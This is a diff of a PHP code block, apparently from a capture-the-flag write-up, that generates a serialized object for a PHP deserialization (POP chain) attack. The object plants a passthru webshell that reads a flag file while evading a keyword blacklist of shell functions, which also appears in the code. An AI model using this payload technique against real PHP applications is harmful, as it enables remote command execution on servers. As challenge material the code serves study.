@@ -19,7 +19,7 @@
 ```php
 <?php
 class openfunc{
-    protected $object;
+    public $object;
     function __construct(){
         $this->object=new evil();
     }
@@ -32,34 +32,52 @@ class openfunc{
 }
 abstract class hack {
 
-    abstract protected function shell();
+    abstract public function pass();
 
     public function action() {
-        $this->shell();
+        $this->pass();
     }
 }
 class normal{
+    public $d;
     function action(){
         echo "you must bypass it";
     }
-}
+} 
 class evil extends hack {
-    protected $data;
+    public $data;
+    public $a;
+    public $b;
+    public $c;
     function __construct(){
         $this->data='<?=passthru("sort /fffffl?ggggg");?>';
+        $this->b=serialize(new normal());
+        $this->c='%73%68%65%6C%6C';
     }
-    protected function shell(){
-        $hack=fopen("hack.php","w") or die("Unable 2 open");
-        if(preg_match('/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/i',$this->data)){
+    public function pass(){
+        $this->a = unserialize($this->b);
+        $this->a->d = urldecode(date($this->c));
+        if($this->a->d=== 'shell'){
+           $this->shell();
+        }
+        else{
+            die(date('Y/m/d H:i:s'));
+        }
+    }
+    function shell(){
+        if(preg_match('/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump|php/i',$this->data)){
             die("you die");
-           }
-        fwrite($hack,$this->data);
-        fclose($hack);
+        }
+        $dir = 'scandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';
+        if(!file_exists($dir)){
+            mkdir($dir);
+            echo $dir;
+        }
+        file_put_contents("$dir" . "hack.php", $this->data);
     }
 }
 $a=serialize(new Openfunc());
 echo $a;
-echo urlencode($a);
 ?>
 ```
 
